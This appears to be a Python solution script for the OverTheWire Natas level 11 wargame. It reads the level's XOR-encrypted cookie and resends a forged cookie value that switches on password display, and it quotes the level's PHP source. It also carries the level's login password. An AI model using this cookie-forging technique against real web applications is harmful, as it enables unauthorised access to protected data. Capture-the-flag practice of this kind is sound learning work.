#!/usr/bin/env python3
'''

https://github.com/JohnHammond/overthewire_natas_solutions/blob/master/natas11.py
https://www.youtube.com/watch?v=P-4DPO_OgIg&list=PL1H1sBF1VAKWM3wMCn6H5Ql6OrgIivt2V&index=9

Level 11 → Level 12
Username: natas11
URL:      http://natas11.natas.labs.overthewire.org
password:  U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
problem:
	Cookies are protected with XOR encryption
    Background color:

write up:
   We need to  change $data["showpassword"] to yes
   There is a function: loadData($def)  and $def is the default data
'''
import base64

import requests
import re
import urllib
import sys



username = 'natas11'
password = 'U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK'


url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
response = session.get(url, auth = (username, password) )
content = response.text
print("1. response.text \n------------------\n",response.text)
print("2. session.cookies =", session.cookies)
print("3. session.cookies[data] =", session.cookies['data'])

#$tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);

unquote = urllib.parse.unquote(session.cookies['data'])# Replace %xx escapes by their single-character equivalent.
print("4. unquote = ", unquote)
decode = base64.b64decode(unquote)# decodes the Base64 encoded bytes-like object or ASCII object s and returns the decoded bytes.
print("5. decode = ", decode)



# print base64.b64decode(urllib.unquote(session.cookies['data'])).encode('hex')



url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
# response = session.get(url, auth = (username, password) )
cookies = { "data" : "ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK" }
response = session.get(url, auth = (username, password), cookies = cookies )


# print base64.b64decode(urllib.unquote(session.cookies['data'])).encode('hex')


content = response.text





print("6. content  \n===========\n ", content)


'''
#Print the source code
url_sorce_code = url + 'index-source.html'
print(" Sorce code of ",url_sorce_code,"\n\n +++++++++++++\n\n")
response = session.get(url_sorce_code, auth = (username, password) )
content = response.text
print( response.text)
'''


'''
Source  code
<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}
saveData($data);



?>

<h1>natas11</h1>
<div id="content">
<body style="background: <?=$data['bgcolor']?>;">
Cookies are protected with XOR encryption<br/><br/>

<?
# We need to  change $data["showpassword"] to yes 
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}

?>



'''